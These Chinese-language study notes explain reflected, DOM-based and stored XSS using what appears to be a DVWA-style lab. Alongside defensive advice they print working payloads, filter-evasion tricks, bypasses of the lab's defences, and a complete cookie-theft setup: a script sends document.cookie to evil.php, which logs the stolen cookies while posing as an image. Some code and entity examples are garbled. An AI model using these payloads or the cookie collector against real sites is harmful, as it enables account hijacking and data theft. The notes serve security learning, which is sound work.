# xss漏洞

1.**通俗的定义：XSS 是指攻击者向存在漏洞的 Web 应用注入恶意脚本代码，使其在用户浏览器中自动执行，从而窃取用户信息、劫持账号或篡改页面的一种 Web 攻击方式。**

2.对比与csrf：

**XSS 是：偷用户身份、执行恶意脚本（劫持用户）**

**CSRF 是：冒用用户身份、让用户替我发请求（利用用户）**

3.原理：XSS 的核心是**网站未过滤用户输入**，导致恶意脚本被浏览器执行；（浏览器“信任网站来源”，）

4.XSS 能干嘛？（危害）：

偷你的 **Cookie（登录状态）**

直接**盗号**

篡改页面内容

跳转到钓鱼网站

偷偷上传木马

用你的身份发消息、改密码、删数据

5.[XSS过滤器规避——OWASP速查表系列](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html)（要学会很重要）

## 1.反射行xss

### 1.定义：

**反射型 XSS 是指攻击者构造包含恶意脚本的 URL，诱使用户点击，服务器不对参数做过滤直接 “反射” 回浏览器执行，从而实现攻击。它是非持久型 XSS，恶意代码只存在于 URL 中，不存入数据库。**

### 2.如何判断自己（网站）有没有 XSS 漏洞？

看网站**有没有地方让你输入内容**

- 搜索框、留言、评论、登录框、URL 里的参数

看网站**会不会把你输入的内容直接显示在页面上**

- 你输入什么，它就显示什么，**不检查、不过滤**

  → 这就99% 有 XSS 漏洞

### 3.怎么防护 XSS？（最简单版）

1.**最核心、最有效：对输出内容编码**

- 把 `< > " ' &` 这些符号变成无害文本

2.**关闭 HTTP TRACE**

- 这是一个很老的功能，黑客能用它偷 Cookie
- 关掉就防住一种偷 Cookie 的方式

3.使用安全库

- OWASP ESAPI 这种现成的安全工具
- 帮你自动过滤、编码，防注入

### 4.常规检查

#### 1.最简单的弹窗输入

```php
<script>alert(/XSS/)</script>
```

##### 1.script（不是弹窗）：

是一个标签，中间可以直接写入各种脚本

<script> 是 HTML 里专门用来写 / 引入客户端脚本（主要是 JavaScript） 的标签，浏览器看到这个标签就会执行里面的代码。

最基础用法（2 种）

1.**直接写代码**（XSS 最常用）

```html
<script>
document.write("Hello World!"); // 页面输出内容，XSS里常用来偷Cookie、弹框
</script>
```

2.**引入外部 JS 文件**（src 属性）

```html
<script src="https://xxx.com/恶意脚本.js"></script>
```

3.这 3 个属性决定 JS 什么时候执行，XSS 里偶尔会用到：

| 属性   | 作用（大白话）                 | 适用场景 |
| ------ | ------------------------------ | -------- |
| async  | 页面边加载，脚本边执行（异步） | 外部脚本 |
| defer  | 页面加载完再执行脚本           | 外部脚本 |
| 无属性 | 先执行脚本，再加载页面（同步） | 所有脚本 |

用法

无属性（同步执行）

```html
 <script src="test.js"></script>
```

给 `<script>` 加 `defer` 属性：

```html
<script defer src="xxx.js"></script>
```

##### 2.alert():弹窗

这是 JavaScript 的内置函数，作用是**在浏览器弹出一个提示框**；

#### 2.不用 script 标签，用**事件属性**执行代码

- `onmouseover`
- `onload`
- `onerror`

这些都是**事件**，不用 script 也能跑 JS。

##### 1.`onmouseover`

```html
<b onmouseover=alert('xss')>点我</b>
```

鼠标一放上去 (点我的位置)→ 弹出框。

##### 2.`onerror`

```html
<img src=x onerror=alert(document.cookie)>
```

图片不存在 → 触发 onerror → 直接偷 Cookie。

##### 3.用**编码绕过过滤**

```html
<IMG SRC=j&#X41vascript:alert('test')>
```

`j&#X41vascript` 就是 `javascript` 的编码写法。

##### 4.用 base64 编码整个脚本

```html
data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg>
```

### 5.url的使用规则

```url
http://域名/路径?参数名1=参数值1&参数名2=参数值2&参数名3=参数值3
```

`?`：**分隔符**，把 “访问的资源路径” 和 “要传递的参数” 分开（告诉服务器：前面是你要找的文件，后面是我给你的数据）；

`参数名=参数值`：**键值对**，“参数名” 是标签（比如快递的 “收件人”），“参数值” 是具体内容（比如 “张三”）；

`&`：**多参数分隔符**，如果要传多个参数，用`&`把它们分开。

### 6.恶意代码（重点）

```javascript
var adr = '../evil.php?cakemonster=' + escape(document.cookie);
```

1.var adr：变量

2.../evil.php：路径（**不能直接用本地桌面路径**：`C:\Users\...` 是你本机文件路径，浏览器 / 网站无法访问，必须把 `evil.php` 放到**Web 服务器**里（比如 Apache/Nginx），通过 `http://` 访问。）

```
http://127.0.0.1/evil.php
```

把 `evil.php` 放到 `phpstudy/WWW/` 目录下

3.cakemonster=：变量名（随便起，只要和文件中的变量名一致就行）

4.escape(document.cookie)：核心函数

5.整体代码

```javascript
<script>
var adr = 'http://127.0.0.1/evil.php?cakemonster=' + escape(document.cookie);
new Image().src = adr;
</script>
```

#### 6.接受代码

```php
<?php
// 获取传过来的Cookie
$cookie = $_GET['cakemonster'];
// 把Cookie写入服务器的文件（追加模式）
$file = fopen("cookie.txt", "a");
fwrite($file, $cookie . "\n"); // 每行存一个用户的Cookie
fclose($file);
// 伪装成图片响应，避免用户察觉
header("Content-Type: image/png");
?>
```

##### 1.`fopen()`：

 函数打开一个文件或 URL。

如果 fopen（） 失败，它将返回 FALSE 并附带错误信息。您可以通过在函数名前面添加一个 '@' 来隐藏错误输出。

```php
fopen(filename,mode,include_path,context)
```

| 参数         | 描述                                                         |
| :----------- | :----------------------------------------------------------- |
| filename     | 必需。规定要打开的文件或 URL。                               |
| mode         | 必需。规定您请求到该文件/流的访问类型。可能的值："r" （只读方式打开，将文件指针指向文件头）"r+" （读写方式打开，将文件指针指向文件头）"w" （写入方式打开，清除文件内容，如果文件不存在则尝试创建之）"w+" （读写方式打开，清除文件内容，如果文件不存在则尝试创建之）"a" （写入方式打开，将文件指针指向文件末尾进行写入，如果文件不存在则尝试创建之）"a+" （读写方式打开，通过将文件指针指向文件末尾进行写入来保存文件内容）"x" （创建一个新的文件并以写入方式打开，如果文件已存在则返回 FALSE 和一个错误）"x+" （创建一个新的文件并以读写方式打开，如果文件已存在则返回 FALSE 和一个错误） |
| include_path | 可选。如果您还想在 include_path（在 php.ini 中）中搜索文件的话，请设置该参数为 '1'。 |
| context      | 可选。规定文件句柄的环境。context 是一套可以修改流的行为的选项。 |

##### 2.fwrite（） 函数

将内容写入一个打开的文件中。

函数会在到达指定长度或读到文件末尾（EOF）时（以先到者为准），停止运行。

如果函数成功执行，则返回写入的字节数。如果失败，则返回 FALSE。

```php
fwrite(file,string,length)
```

| file   | 必需。规定要写入的打开文件。       |
| ------ | ---------------------------------- |
| string | 必需。规定要写入打开文件的字符串。 |
| length | 可选。规定要写入的最大字节数。     |

##### 3.fclose（） 函数

关闭打开的文件。

#### 7.查看

在evil.php所在的根目录下会自动生成cookie.txt，

你直接打开这个 `cookie.txt` 文件，就能看到所有被偷的 Cookie 记录了。

## 2.基于DOM的跨站脚本（XSS）

### 1.定义：

基于 DOM 的 XSS 是**不经过服务器**的 XSS 漏洞 —— 恶意代码完全在浏览器的 DOM（页面文档模型）中执行，服务器接收和返回的数据都是 “干净的”，但浏览器解析页面时，JS 代码把用户输入（URL 参数、输入框内容）直接插入到 DOM 中，导致恶意脚本执行。

（DOM = 浏览器里的页面结构）

### 2.加载页面

```php+HTML
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Language Selector (正常场景)</title>
</head>
<body>
    <h3>Select your language:</h3>
    <!-- 下拉框容器，JS会往里面写入选项 -->
    <select>
        <script>
            // 步骤1：从URL中提取default参数的值
            // 1.1 获取完整URL
            var fullUrl = document.location.href;
            // 1.2 找到"default="的起始位置
            var defaultPos = fullUrl.indexOf("default=");
            // 1.3 跳过"default="（8个字符），截取后面的内容
            var langValue = fullUrl.substring(defaultPos + 8);

            // 步骤2：解码URL参数（处理可能的编码字符）
            var decodedLang = decodeURIComponent(langValue);

            // 步骤3：把解码后的语言值写入OPTION标签
            document.write("<OPTION value=1>" + decodedLang + "</OPTION>");
            // 固定的English选项
            document.write("<OPTION value=2>English</OPTION>");
        </script>
    </select>
</body>
</html>
```

#### 1.核心理解

##### 1.`document`

 是浏览器自动创建的**全局对象**，代表整个 HTML 文档，是 JS 操作HTML页面的唯一入口；（很重要）

<!--`document` 对象是JavaScript 代码对html文件的唯一代理，就是JavaScript对HTML文件做任何操作，都要通过document对象-->

2.`document.xxx` 分两种：不加 `()` 是读数据（属性），加 `()` 是执行功能（方法）；

(1)所以不加 `()`时document.xxx是属性

eg:document.location.href   => 获取完整 URL（比如 `http://xxx.com?default=French`

且document.xxx和页面结构DOM 树一一对应（只是document.xxx一小部分属性）

(2)如果加 `()`是执行功能（方法）；

HTML文档中可以使用以下属性和方法:

| 属性 / 方法                                                  | 描述                                                         |
| :----------------------------------------------------------- | :----------------------------------------------------------- |
| [document.activeElement](https://www.runoob.com/jsref/prop-document-activeelement.html) | 返回当前获取焦点元素                                         |
| [document.addEventListener()](https://www.runoob.com/jsref/met-document-addeventlistener.html) | 向文档添加句柄                                               |
| [document.adoptNode(node)](https://www.runoob.com/jsref/met-document-adoptnode.html) | 从另外一个文档返回 adapded 节点到当前文档。                  |
| [document.anchors](https://www.runoob.com/jsref/coll-doc-anchors.html) | 返回对文档中所有 Anchor 对象的引用。                         |
| document.applets                                             | 返回对文档中所有 Applet 对象的引用。**注意:** HTML5 已不支持 <applet> 元素。 |
| [document.baseURI](https://www.runoob.com/jsref/prop-doc-baseuri.html) | 返回文档的绝对基础 URI                                       |
| [document.body](https://www.runoob.com/jsref/prop-doc-body.html) | 返回文档的body元素                                           |
| [document.close()](https://www.runoob.com/jsref/met-doc-close.html) | 关闭用 document.open() 方法打开的输出流，并显示选定的数据。  |
| [document.cookie](https://www.runoob.com/jsref/prop-doc-cookie.html) | 设置或返回与当前文档有关的所有 cookie。                      |
| [document.createAttribute()](https://www.runoob.com/jsref/met-document-createattribute.html) | 创建一个属性节点                                             |
| [document.createComment()](https://www.runoob.com/jsref/met-document-createcomment.html) | createComment() 方法可创建注释节点。                         |
| [document.createDocumentFragment()](https://www.runoob.com/jsref/met-document-createdocumentfragment.html) | 创建空的 DocumentFragment 对象，并返回此对象。               |
| [document.createElement()](https://www.runoob.com/jsref/met-document-createelement.html) | 创建元素节点。                                               |
| [document.createTextNode()](https://www.runoob.com/jsref/met-document-createtextnode.html) | 创建文本节点。                                               |
| [document.doctype](https://www.runoob.com/jsref/prop-document-doctype.html) | 返回与文档相关的文档类型声明 (DTD)。                         |
| [document.documentElement](https://www.runoob.com/jsref/prop-document-documentelement.html) | 返回文档的根节点                                             |
| [document.documentMode](https://www.runoob.com/jsref/prop-doc-documentmode.html) | 返回用于通过浏览器渲染文档的模式                             |
| [document.documentURI](https://www.runoob.com/jsref/prop-document-documenturi.html) | 设置或返回文档的位置                                         |
| [document.domain](https://www.runoob.com/jsref/prop-doc-domain.html) | 返回当前文档的域名。                                         |
| document.domConfig                                           | **已废弃**。返回 normalizeDocument() 被调用时所使用的配置。  |
| [document.embeds](https://www.runoob.com/jsref/coll-doc-embeds.html) | 返回文档中所有嵌入的内容（embed）集合                        |
| [document.forms](https://www.runoob.com/jsref/coll-doc-forms.html) | 返回对文档中所有 Form 对象引用。                             |
| [document.getElementsByClassName()](https://www.runoob.com/jsref/met-document-getelementsbyclassname.html) | 返回文档中所有指定类名的元素集合，作为 NodeList 对象。       |
| [document.getElementById()](https://www.runoob.com/jsref/met-document-getelementbyid.html) | 返回对拥有指定 id 的第一个对象的引用。                       |
| [document.getElementsByName()](https://www.runoob.com/jsref/met-doc-getelementsbyname.html) | 返回带有指定名称的对象集合。                                 |
| [document.getElementsByTagName()](https://www.runoob.com/jsref/met-document-getelementsbytagname.html) | 返回带有指定标签名的对象集合。                               |
| [document.images](https://www.runoob.com/jsref/coll-doc-images.html) | 返回对文档中所有 Image 对象引用。                            |
| [document.implementation](https://www.runoob.com/jsref/prop-document-implementation.html) | 返回处理该文档的 DOMImplementation 对象。                    |
| [document.importNode()](https://www.runoob.com/jsref/met-document-importnode.html) | 把一个节点从另一个文档复制到该文档以便应用。                 |
| [document.inputEncoding](https://www.runoob.com/jsref/prop-document-inputencoding.html) | 返回用于文档的编码方式（在解析时）。                         |
| [document.lastModified](https://www.runoob.com/jsref/prop-doc-lastmodified.html) | 返回文档被最后修改的日期和时间。                             |
| [document.links](https://www.runoob.com/jsref/coll-doc-links.html) | 返回对文档中所有 Area 和 Link 对象引用。                     |
| [document.normalize()](https://www.runoob.com/jsref/met-document-normalize.html) | 删除空文本节点，并连接相邻节点                               |
| [document.normalizeDocument()](https://www.runoob.com/jsref/met-document-normalizedocument.html) | 删除空文本节点，并连接相邻节点的                             |
| [document.open()](https://www.runoob.com/jsref/met-doc-open.html) | 打开一个流，以收集来自任何 document.write() 或 document.writeln() 方法的输出。 |
| [document.querySelector()](https://www.runoob.com/jsref/met-document-queryselector.html) | 返回文档中匹配指定的CSS选择器的第一元素                      |
| [document.querySelectorAll()](https://www.runoob.com/jsref/met-document-queryselectorall.html) | document.querySelectorAll() 是 HTML5中引入的新方法，返回文档中匹配的CSS选择器的所有元素节点列表 |
| [document.readyState](https://www.runoob.com/jsref/prop-doc-readystate.html) | 返回文档状态 (载入中……)                                      |
| [document.referrer](https://www.runoob.com/jsref/prop-doc-referrer.html) | 返回载入当前文档的文档的 URL。                               |
| [document.removeEventListener()](https://www.runoob.com/jsref/met-document-removeeventlistener.html) | 移除文档中的事件句柄(由 addEventListener() 方法添加)         |
| [document.renameNode()](https://www.runoob.com/jsref/met-document-renamenode.html) | 重命名元素或者属性节点。                                     |
| [document.scripts](https://www.runoob.com/jsref/coll-doc-scripts.html) | 返回页面中所有脚本的集合。                                   |
| [document.strictErrorChecking](https://www.runoob.com/jsref/prop-document-stricterrorchecking.html) | 设置或返回是否强制进行错误检查。                             |
| [document.title](https://www.runoob.com/jsref/prop-doc-title.html) | 返回当前文档的标题。                                         |
| [document.URL](https://www.runoob.com/jsref/prop-doc-url.html) | 返回文档完整的URL                                            |
| [document.write()](https://www.runoob.com/jsref/met-doc-write.html) | 向文档写 HTML 表达式 或 JavaScript 代码。                    |
| [document.writeln()](https://www.runoob.com/jsref/met-doc-writeln.html) | 等同于 write() 方法，不同的是在每个表达式之后写一个换行符。  |

补充：

在**现代浏览器中，document.URL 和 document.location.href 几乎没有区别**—— 两者都是返回当前页面的完整 URL 字符串（比如 `http://www.some.site/page.html?default=French`）；

唯一的细微差异是 **可写性**：`document.URL` 是只读属性，`document.location.href` 可读写（能通过赋值跳转页面）。

##### 2.`indexOf`

indexOf 是 JavaScript 中**字符串 / 数组的内置方法**（函数），作用是：**查找某个指定内容在字符串 / 数组中第一次出现的位置（下标）**，找到则返回数字下标（从 0 开始），没找到则返回 `-1`

##### 3.substring

`substring` 是 JavaScript 中**字符串的内置方法**（函数），作用是：**从一个字符串中截取指定区间的字符，返回新的子字符串**（不会修改原字符串）。

##### 4.`decodeURIComponent()`

 decodeURIComponent()是 JavaScript 中**专门用于解码 URL 编码字符**的内置函数，作用是：把 URL 中被编码成 `%XX` 格式的特殊字符（比如 `<` 编码成 `%3C`、空格编码成 `%20`）还原成原始字符，是 URL 编码函数 `encodeURIComponent()` 的反向操作。

你之前的 DOM-XSS 案例中，这个函数是攻击者能成功注入恶意代码的关键 —— 即使浏览器自动编码了 URL 中的 `<>` 等字符，`decodeURIComponent()` 也会把它们还原，让恶意代码生效。

### 3.代码防御

#### 1.中级代码防御

```php
<?php

// Is there any input?
if ( ( "default", $_GET ) && !is_null ($_GET[ 'default' ]) ) {
    $default = $_GET['default'];
    
    # Do not allow script tags
    if (stripos ($default, "<script") !== false) {
        header ("location: ?default=English");
        exit;
    }
}

?>
```

1.防御原理：过滤<script>标签

2.绕过看“不用 script 标签，用**事件属性**执行代码（上面）”

3.`array_key_exists` 是 **PHP 内置函数**，作用是：**检查一个指定的 “键名” 是否存在于某个数组中**，存在则返回 `true`，不存在则返回 `false`。

#### 2高级代码防御

```php
<?php

// Is there any input?
if ( array_key_exists( "default", $_GET ) && !is_null ($_GET[ 'default' ]) ) {

    # White list the allowable languages
    switch ($_GET['default']) {
        case "French":
        case "English":
        case "German":
        case "Spanish":
            # ok
            break;
        default:
            header ("location: ?default=English");
            exit;
    }
}

?>

```

1.防御原理：白名单：只能是 

​        case "French":
​        case "English":
​        case "German":
​        case "Spanish":

2.绕过方式：基于URL的使用规则在?default=English加一个新参数text=xxxx:

```php
?default=English&text=<b onmouseover=alert('xss')>点我</b>
```

3.绕过原理：**前端 JS 不是只读取 `default` 参数，而是读取整个 URL 并解析渲染**—— 即使代码里没显式处理 `text`，只要前端把整个 URL 内容插入 DOM，`text` 后的恶意标签就会被执行；你看到的 PHP 代码只防御了 `default` 参数，对 `text` 参数完全 “视而不见”，且前端的 DOM 解析逻辑才是触发 XSS 的关键（服务器端代码管不到前端解析）。

4.为什么 `text` 参数里的恶意标签能执行？（核心：前端 DOM 逻辑）

（1）前端读取「整个 URL」而非仅 `default` 参数

（2）前端读取「所有 URL 参数」并拼接渲染

### 4示例

#### 1.基于URL 锚点`#`避开服务器检测

1.原理：URL 中`#`后的部分被称为**URI 片段 / 锚点**，浏览器在向服务器发送 HTTP 请求时，**只会发送`#`之前的内容**，`#`后的所有字符仅在浏览器本地解析，服务器全程无法获取、无法检测。（大体意思是后端的安全，检测不到前端，后端只检测URL中的部分内容，但是前端的double却要渲染整个URL）

2.**核心原理**：URL 中`#`后的部分被称为**URI 片段 / 锚点**，浏览器在向服务器发送 HTTP 请求时，**只会发送`#`之前的内容**，`#`后的所有字符仅在浏览器本地解析，服务器全程无法获取、无法检测。

3.**攻击实现**：将恶意载荷从`?`后的 URL 参数，转移到`#`后的锚点区域。

- 基础 DOM-XSS（服务器可检测）：`http://www.some.site/page.html?default=<script>alert(document.cookie)</script>`
- 高级绕过版（服务器无感知）：`http://www.some.site/page.html#default=<script>alert(document.cookie)</script>`

4.嗯，当PHP接收不到参数的时候，它有的代码会报错，有的代码不会报错，主要看它核心看**是否访问了不存在的变量 / 参数，且没有提前做存在性校验**，如果有就会报错，如果没有就不会，但是大部分90%都没有，如果收不到参数，一般只会把这个错误设为通知级错误，然后写在日志文件里

### 5.实战的内容(扩展后面学)

Ory Segal 给了一个示例（“Javascript 流操作”部分，见 [2]）如何构图目标页面及其父页（在 攻击者的控制权）可以设计成影响 以攻击者期望的方式执行目标页面。该 该技术展示了DOM操作如何有助于修改 目标页面脚本的执行流程。

Kuza55 和 Stefano Di Paola 讨论了更多关于 DOM 操作和基于 DOM 的 XSS 可以在 [3] 中得到扩展。

### 测试工具与技术

1. DOM XSS 维基——定义来源的知识库起点 攻击者控制的输入和汇，可能 引入基于DOM的XSS问题。截至2011年11月17日，它非常不成熟。 如果你知道更危险的水槽，请为这个维基贡献一些帮助 和/或安全的替代品！！

参见：[http://code.google.com/p/domxsswiki/](https://code.google.com/p/domxsswiki/)

2. DOM Snitch - 一个实验性的 Chrome 扩展，支持 开发者和测试人员识别常见的不安全做法 客户端代码。来自谷歌。

参见：[http://code.google.com/p/domsnitch/](https://code.google.com/p/domsnitch/)

### 防御技术

参见：https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html

### 参考文献

[1] “基于DOM的跨站点脚本或第三类XSS”（WASC 文章），Amit Klein，2005年7月

http://www.webappsec.org/projects/articles/071105.shtml

[2] “JavaScript 代码流操作及一个真实世界的例子 咨询 - Adobe Flex 3 基于 Dom-Based XSS“（Watchfire 博客），Ory Segal，6 月 2008年17日

http://blog.watchfire.com/wfblog/2008/06/javascript-code.html

[3] “攻击富互联网应用”（RUXCON 2008 演讲）， Kuza55 和 Stefano Di Paola，2008年11月

http://www.ruxcon.org.au/files/2008/Attacking_Rich_Internet_Applications.pdf

[4] “颠覆阿贾克斯”（23C3 演出），斯特凡诺·迪·保拉和 乔治奥·费东，2006年12月

http://events.ccc.de/congress/2006/Fahrplan/attachments/1158-Subverting_Ajax.pdf

[5] “保护网页应用免受通用PDF XSS侵害”（2007年OWASP 欧洲应用安全报告）伊万·里斯蒂奇，2007年5月

https://wiki.owasp.org/images/c/c2/OWASPAppSec2007Milan_ProtectingWebAppsfromUniversalPDFXSS.ppt

[6] OWASP测试指南

[Testing_for_DOM-based_Cross_site_scripting_（OWASP-DV-003）](https://owasp.org/www-community/attacks/Testing_for_DOM-based_Cross_site_scripting_/(OWASP-DV-003/))

## 3.存储跨站脚本（XSS）

### 1.定义：

存储型 XSS（也叫 “持久型 XSS”）是跨站脚本攻击中**危害最大的一类**：攻击者将恶意 JS 代码**永久存储到目标网站的服务器数据库 / 文件中**（比如评论区、用户资料、私信等），当其他用户访问包含该恶意代码的页面时，代码会从服务器加载并在用户浏览器中执行 —— 攻击无需诱骗用户点击特定链接，只要访问受影响页面就会中招。

### 2.中级防御手段

1. strip_tags：删除所有HTML标签

   写法：

```php
strip_tags(*string,allow*)
```

| 参数     | 描述                                       |
| :------- | :----------------------------------------- |
| *string* | 必需。规定要检查的字符串。                 |
| *allow*  | 可选。规定允许的标签。这些标签不会被删除。 |

2.htmlspecialchars（）: 函数把一些预定义的字符转换为 HTML 实体。

   预定义的字符:

- & （和号）成为 &
- “ （双引号）成为 ”
- ' （单引号）成为 '
- < （小于）成为 &;
- \> （大于）成为 >

写法：

```php
htmlspecialchars(string,flags,character-set,double_encode)
```

| 参数            | 描述                                                         |
| :-------------- | :----------------------------------------------------------- |
| string          | 必需。规定要转换的字符串。                                   |
| flags           | 可选。规定如何处理引号、无效的编码以及使用哪种文档类型。可用的引号类型：ENT_COMPAT - 默认。仅编码双引号。ENT_QUOTES - 编码双引号和单引号。ENT_NOQUOTES - 不编码任何引号。无效的编码：ENT_IGNORE - 忽略无效的编码，而不是让函数返回一个空的字符串。应尽量避免，因为这可能对安全性有影响。ENT_SUBSTITUTE - 把无效的编码替代成一个指定的带有 Unicode 替代字符 U+FFFD（UTF-8）或者 & #FFFD;的字符，而不是返回一个空的字符串。ENT_DISALLOWED - 把指定文档类型中的无效代码点替代成 Unicode 替代字符 U+FFFD（UTF-8）或者 &#FFFD;。规定使用的文档类型的附加 flags：ENT_HTML401 - 默认。作为 HTML 4.01 处理代码。ENT_HTML5 - 作为 HTML 5 处理代码。ENT_XML1 - 作为 XML 1 处理代码。ENT_XHTML - 作为 XHTML 处理代码。 |
| character-set   | 可选。一个规定了要使用的字符集的字符串。允许的值：UTF-8 - 默认。ASCII 兼容多字节的 8 位 UnicodeISO-8859-1 - 西欧ISO-8859-15 - 西欧（加入欧元符号 + ISO-8859-1 中丢失的法语和芬兰语字母）cp866 - DOS 专用 西里尔字母字符集cp1251 - Windows 专用西里尔字母集cp1252 - Windows 专用西欧字符集KOI8-R - 俄语BIG5 - 繁体中文，主要在台湾使用GB2312 - 简体中文，国家标准字符集BIG5-HKSCS - 带香港扩展的 Big5Shift_JIS - 日语EUC-JP - 日语MacRoman - Mac 操作系统使用的字符集**注释：**在 PHP 5.4 之前的版本，无法被识别的字符集将被忽略并由 ISO-8859-1 替代。自 PHP 5.4 起，无法被识别的字符集将被忽略并由 UTF-8 替代。 |
| *double_encode* | 可选。一个规定了是否编码已存在的 HTML 实体的布尔值。TRUE - 默认。将对每个实体进行转换。FALSE - 不会对已存在的 HTML 实体进行编码。 |

### 3.绕过方式

1.由于内容防御几乎无懈可击，所以可以通过姓名进行注入

2.姓名有长度限制，这个时候按F12点开控制台找到，姓名的前端限制参数，改了就行

```html
<input name="txtName" type="text" size="30" maxlength="100">
```

## 4.xss速查表（后面学，重要）

